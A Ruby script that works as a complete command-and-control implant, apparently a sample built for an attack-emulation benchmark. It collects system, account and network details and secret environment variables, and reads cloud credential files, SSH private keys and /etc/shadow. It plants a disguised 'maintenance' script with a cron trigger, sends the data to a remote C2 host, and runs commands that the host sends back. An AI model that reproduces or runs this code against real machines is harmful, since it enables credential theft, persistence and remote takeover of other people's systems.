#!/usr/bin/env ruby
require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'openssl'
require 'socket'
require 'etc'
require 'time'
require 'fileutils'
require 'digest'
require 'open3'
require 'rbconfig'

C2_HOST = 'iosxe-ruby-beacon-cloud-account-lure-4a7fe.benchmark.atomdrift.org'
C2_PORT = 443
BEACON_INTERVAL = 30
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def safety_gate
  return true if File.exist?(File.join(Dir.home, '.4pz4ft'))
  warn '[!] Safety gate check failed. Exiting.'
  exit 1
end

def hostname
  Socket.gethostname
end

def os_info
  begin
    {
      os: RbConfig::CONFIG['host_os'],
      arch: RbConfig::CONFIG['arch'],
      ruby_version: RUBY_VERSION,
      hostname: hostname,
      user: begin; Etc.getlogin; rescue; Etc.getpwuid.name; end,
      uid: Etc.getuid,
      gid: Etc.getgid
    }
  rescue => e
    { error: e.message }
  end
end

def discover_accounts
  accounts = []
  begin
    File.foreach('/etc/passwd').each do |line|
      next if line.strip.empty?
      fields = line.split(':')
      accounts << {
        username: fields[0],
        uid: fields[2],
        gid: fields[3],
        home: fields[5],
        shell: fields[6]
      }
    end
  rescue
    # fallback: current user only
    accounts << {
      username: begin; Etc.getlogin; rescue; 'unknown'; end,
      uid: Etc.getuid,
      home: Dir.home
    }
  end
  accounts
end

def discover_network_interfaces
  interfaces = []
  begin
    Socket.ip_address_list.each do |addrinfo|
      interfaces << {
        name: addrinfo.name,
        address: addrinfo.ip_address,
        netmask: addrinfo.netmask,
        scope: addrinfo.scope_id,
        loopback: addrinfo.loopback?,
        multicast: addrinfo.multicast?
      }
    end
  rescue => e
    interfaces << { error: e.message }
  end
  interfaces
end

def discover_environment
  env_vars = {}
  sensitive_keys = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
                    'AZURE_CLIENT_SECRET', 'GOOGLE_APPLICATION_CREDENTIALS',
                    'KUBECONFIG', 'DOCKER_CONFIG', 'NETRC', 'HOME',
                    'PATH', 'USER', 'SHELL', 'EDITOR', 'TERM']
  ENV.each do |k, v|
    env_vars[k] = v if sensitive_keys.include?(k) || k =~ /SECRET|TOKEN|KEY|CREDENTIAL|PASSWORD|AUTH/i
  end
  env_vars
end

def access_cloud_credentials
  credentials = {}
  credential_paths = [
    File.join(Dir.home, '.aws', 'credentials'),
    File.join(Dir.home, '.aws', 'config'),
    File.join(Dir.home, '.azure', 'credentials'),
    File.join(Dir.home, '.gcloud', 'application_default_credentials.json'),
    File.join(Dir.home, '.kube', 'config'),
    File.join(Dir.home, '.docker', 'config.json'),
    File.join(Dir.home, '.netrc'),
    File.join(Dir.home, '.ssh', 'id_rsa'),
    File.join(Dir.home, '.ssh', 'id_ed25519'),
    File.join(Dir.home, '.ssh', 'known_hosts'),
    '/etc/shadow',
    '/etc/passwd'
  ]

  credential_paths.each do |path|
    next unless File.exist?(path)
    begin
      content = File.read(path)
      credentials[path] = {
        found: true,
        size: content.bytesize,
        md5: Digest::MD5.hexdigest(content),
        lines: content.lines.count,
        preview: content.lines.first(3).map(&:strip).join(' | ')
      }
    rescue => e
      credentials[path] = { found: false, error: e.message }
    end
  end
  credentials
end

def create_lure
  lure_dir = File.join(Dir.home, '.cache', 'system_update')
  FileUtils.mkdir_p(lure_dir)

  # Create a decoy config file that looks like a system update configuration
  config_content = {
    'update_policy' => {
      'auto_apply' => true,
      'schedule' => '0 */6 * * *',
      'source' => "https://#{C2_HOST}/updates",
      'verify_signature' => false,
      'rollback_on_failure' => false
    },
    'modules' => [
      { 'name' => 'iosxe-patch-2026-05', 'version' => '17.12.4', 'priority' => 'critical' },
      { 'name' => 'security-baseline', 'version' => '3.2.1', 'priority' => 'high' }
    ]
  }.to_json

  File.write(File.join(lure_dir, 'update-config.json'), config_content)

  # Create an executable script disguised as a system maintenance task
  script_content = <<~SCRIPT
    #!/usr/bin/env ruby
    require 'net/http'
    require 'json'
    require 'open3'

    # Scheduled maintenance routine - auto-applied by update policy
    HOST = '#{C2_HOST}'

    def apply_maintenance
      uri = URI("https://\#{HOST}/api/v1/maintenance/execute")
      req = Net::HTTP::Post.new(uri)
      req['Content-Type'] = 'application/json'
      req['X-Maintenance-Token'] = 'auto-scheduled'

      payload = {
        action: 'apply_patches',
        target: 'all',
        force: true,
        timestamp: Time.now.iso8601
      }

      https = Net::HTTP.new(uri.host, uri.port)
      https.use_ssl = true
      https.verify_mode = OpenSSL::SSL::VERIFY_NONE
      https.open_timeout = 10
      https.read_timeout = 30

      res = https.request(req, payload.to_json)
      JSON.parse(res.body)
    end

    apply_maintenance
  SCRIPT

  script_path = File.join(lure_dir, 'maintenance_runner.rb')
  File.write(script_path, script_content)
  FileUtils.chmod(0755, script_path)

  # Create a cron-like trigger file
  trigger_content = <<~TRIGGER
    # System maintenance scheduler
    # Auto-generated - do not modify
    0 */6 * * * root ruby #{script_path}
    */15 * * * * root ruby #{script_path} --health-check
  TRIGGER

  File.write(File.join(lure_dir, 'maintenance.cron'), trigger_content)

  {
    directory: lure_dir,
    files: ['update-config.json', 'maintenance_runner.rb', 'maintenance.cron'],
    script_path: script_path
  }
end

def beacon(session_id, stage, data)
  uri = URI("https://#{C2_HOST}/api/v1/beacon")
  req = Net::HTTP::Post.new(uri)
  req['Content-Type'] = 'application/json'
  req['User-Agent'] = USER_AGENT
  req['X-Session'] = session_id
  req['X-Stage'] = stage

  payload = {
    session: session_id,
    stage: stage,
    timestamp: Time.now.iso8601,
    hostname: hostname,
    data: data
  }

  https = Net::HTTP.new(uri.host, uri.port)
  https.use_ssl = true
  https.verify_mode = OpenSSL::SSL::VERIFY_NONE
  https.open_timeout = 15
  https.read_timeout = 30

  begin
    res = https.request(req, payload.to_json)
    response_body = JSON.parse(res.body) rescue nil
    { status: res.code, response: response_body }
  rescue => e
    { status: 'error', error: e.message }
  end
end

def fetch_commands(session_id)
  uri = URI("https://#{C2_HOST}/api/v1/commands?session=#{session_id}")
  req = Net::HTTP::Get.new(uri)
  req['User-Agent'] = USER_AGENT
  req['X-Session'] = session_id

  https = Net::HTTP.new(uri.host, uri.port)
  https.use_ssl = true
  https.verify_mode = OpenSSL::SSL::VERIFY_NONE
  https.open_timeout = 15
  https.read_timeout = 30

  begin
    res = https.request(req)
    commands = JSON.parse(res.body)['commands'] rescue []
    commands
  rescue => e
    []
  end
end

def generate_session_id
  OpenSSL::SecureRandom.hex(16)
end

def main
  safety_gate

  session_id = generate_session_id
  puts "[*] Session: #{session_id}"

  # Stage 1: Initial beacon with system info
  sys_info = os_info
  puts "[*] Sending initial beacon..."
  beacon(session_id, 'init', sys_info)

  # Stage 2: Account discovery
  puts "[*] Discovering accounts..."
  accounts = discover_accounts
  puts "[*] Found #{accounts.size} accounts"

  puts "[*] Discovering network interfaces..."
  interfaces = discover_network_interfaces
  puts "[*] Found #{interfaces.size} interfaces"

  puts "[*] Scanning environment variables..."
  env_data = discover_environment
  puts "[*] Found #{env_data.size} sensitive env vars"

  discovery_data = {
    accounts: accounts,
    interfaces: interfaces,
    environment: env_data
  }
  beacon(session_id, 'discovery', discovery_data)

  # Stage 3: Cloud credential access
  puts "[*] Accessing cloud credentials..."
  credentials = access_cloud_credentials
  found_count = credentials.values.count { |v| v[:found] == true }
  puts "[*] Found #{found_count} credential files"
  beacon(session_id, 'credentials', credentials)

  # Stage 4: Create lure
  puts "[*] Deploying execution lure..."
  lure = create_lure
  puts "[*] Lure deployed at: #{lure[:directory]}"
  beacon(session_id, 'lure_deployed', lure)

  # Stage 5: Exfiltrate collected data
  puts "[*] Exfiltrating collected data..."
  exfil_payload = {
    session: session_id,
    system: sys_info,
    accounts: accounts,
    interfaces: interfaces,
    credentials_summary: credentials.keys,
    credential_count: found_count,
    lure: lure
  }

  exfil_uri = URI("https://#{C2_HOST}/api/v1/exfil")
  exfil_req = Net::HTTP::Post.new(exfil_uri)
  exfil_req['Content-Type'] = 'application/json'
  exfil_req['User-Agent'] = USER_AGENT
  exfil_req['X-Session'] = session_id

  https = Net::HTTP.new(exfil_uri.host, exfil_uri.port)
  https.use_ssl = true
  https.verify_mode = OpenSSL::SSL::VERIFY_NONE
  https.open_timeout = 15
  https.read_timeout = 30

  begin
    res = https.request(exfil_req, exfil_payload.to_json)
    puts "[*] Exfiltration complete (HTTP #{res.code})"
  rescue => e
    puts "[!] Exfiltration failed: #{e.message}"
  end

  # Stage 6: C2 callback loop (beacon with command polling)
  puts "[*] Entering C2 callback loop (#{BEACON_INTERVAL}s interval)..."
  loop_count = 0
  max_loops = 3

  while loop_count < max_loops
    loop_count += 1
    puts "[*] Beacon check-in ##{loop_count}..."

    beacon(session_id, 'heartbeat', { loop: loop_count, uptime: Time.now.iso8601 })

    commands = fetch_commands(session_id)
    unless commands.empty?
      puts "[*] Received #{commands.size} commands"
      commands.each do |cmd|
        puts "[*] Executing: #{cmd['command']}"
        begin
          stdout, stderr, status = Open3.capture3(cmd['command'])
          beacon(session_id, 'cmd_output', {
            command: cmd['command'],
            stdout: stdout,
            stderr: stderr,
            exit_code: status.exitstatus
          })
        rescue => e
          beacon(session_id, 'cmd_error', { command: cmd['command'], error: e.message })
        end
      end
    end

    sleep BEACON_INTERVAL
  end

  puts "[*] Session #{session_id} complete."
end

main
